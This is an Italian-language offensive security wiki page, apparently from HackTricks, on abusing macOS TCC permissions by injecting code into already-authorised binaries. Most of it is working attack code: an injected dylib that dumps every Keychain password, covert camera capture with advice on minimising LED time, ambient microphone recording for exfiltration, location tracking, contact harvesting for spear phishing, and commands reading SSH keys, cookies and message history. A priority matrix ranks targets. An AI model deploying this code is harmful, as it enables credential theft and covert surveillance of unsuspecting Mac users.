# Furto di credenziali e dati tramite permessi TCC di macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

macOS TCC (Transparency, Consent, and Control) protegge l'accesso ai dati sensibili degli utenti. Quando un attaccante **compromette un binary che dispone già di TCC grants**, eredita quei permessi. Questa pagina documenta il potenziale di exploitation di ciascun permesso TCC correlato al furto di dati.<sup>[[2]](#references)</sup>

> [!WARNING]
> La code injection in un binary con TCC grants (tramite DYLD injection, dylib hijacking o task port) **eredita silenziosamente tutti i relativi permessi TCC**. Quando lo stesso processo legge dati protetti, non viene visualizzato alcun prompt aggiuntivo né viene eseguita alcuna verifica.<sup>[[4]](#references)</sup>

---

## Gruppi di accesso al Keychain

### Il bottino

Il Keychain di macOS memorizza:
- **Password Wi-Fi** — tutte le credenziali delle reti wireless salvate
- **Password dei siti web** — password di Safari, Chrome (quando utilizza il Keychain) e di altri browser
- **Password delle applicazioni** — account email, credenziali VPN, token di sviluppo
- **Certificati e chiavi private** — code signing, TLS client, crittografia S/MIME
- **Note sicure** — segreti memorizzati dall'utente

### Entitlement: `keychain-access-groups`

Gli elementi del Keychain sono organizzati in **gruppi di accesso**. L'entitlement `keychain-access-groups` di un'applicazione elenca i gruppi a cui può accedere:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Sfruttamento
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Furto del portachiavi
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Accesso alla fotocamera (kTCCServiceCamera)

### Exploitation

Un binary con un TCC grant per la fotocamera (tramite `kTCCServiceCamera` o l’entitlement `com.apple.security.device.camera`) può acquisire foto e video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> A partire da **macOS Sonoma**, l'indicatore della fotocamera nella barra dei menu è permanente e non può essere nascosto programmaticamente. Nelle **versioni precedenti di macOS**, una breve acquisizione potrebbe non produrre un indicatore visibile.

---

## Accesso al microfono (kTCCServiceMicrophone)

### Exploitation

L'accesso al microfono acquisisce tutto l'audio dal microfono integrato, dalle cuffie o dai dispositivi di input audio collegati:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Registrazione ambientale
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Tracciamento della posizione (kTCCServiceLocation)

### Sfruttamento
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Monitoraggio continuo
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contatti / Calendario / Foto

### Esfiltrazione dei dati personali

| Servizio TCC | Framework | Dati |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Nomi, email, numeri di telefono, indirizzi |
| `kTCCServiceCalendar` | `EventKit` | Riunioni, partecipanti, luoghi |
| `kTCCServicePhotos` | `Photos.framework` | Foto, screenshot, metadati di posizione |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Raccolta dei contatti
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Accesso all'account iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Questo entitlement consente di comunicare con il servizio XPC `com.apple.iCloudHelper`, fornendo accesso a:
- **Token iCloud** — token di autenticazione per l'Apple ID dell'utente
- **iCloud Drive** — documenti sincronizzati da tutti i dispositivi
- **Portachiavi iCloud** — password sincronizzate su tutti i dispositivi Apple
- **Find My** — posizione di tutti i dispositivi Apple dell'utente<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromettere un binary con entitlement iCloud estende l'attacco da un **singolo dispositivo all'intero ecosistema Apple**: altri Mac, iPhone, iPad, Apple Watch. La sincronizzazione di iCloud Keychain significa che le password di tutti i dispositivi sono accessibili.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### La permission TCC più potente

Full Disk Access concede la capacità di lettura di **ogni file sul sistema**, inclusi:
- I dati di altre app (Messaggi, Mail, cronologia di Safari)
- I database TCC (rivelando tutte le altre permission)
- Chiavi e configurazione SSH
- Cookie del browser e token di sessione
- Database e cache delle applicazioni
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrice delle priorità di exploitation

Quando valuti i binary con permessi TCC iniettabili, stabilisci le priorità in base al valore dei dati:

| Priorità | Permesso TCC | Perché |
|---|---|---|
| **Critica** | Full Disk Access | Accesso a tutto |
| **Critica** | TCC Manager | Può concedere qualsiasi permesso |
| **Alta** | Keychain Access Groups | Tutte le password archiviate |
| **Alta** | iCloud Account Access | Compromissione multi-dispositivo |
| **Alta** | Input Monitoring (ListenEvent) | Keylogging |
| **Alta** | Accessibility | Controllo della GUI, self-granting |
| **Media** | Screen Capture | Acquisizione di dati visivi |
| **Media** | Camera + Microphone | Sorveglianza |
| **Media** | Contacts + Calendar | Dati per il social engineering |
| **Bassa** | Location | Tracciamento fisico |
| **Bassa** | Photos | Dati personali |

## Script di enumerazione
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Servizi Keychain](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Cosa succede sul tuo Mac rimane sull'iCloud di Apple?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Sfruttamento di TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
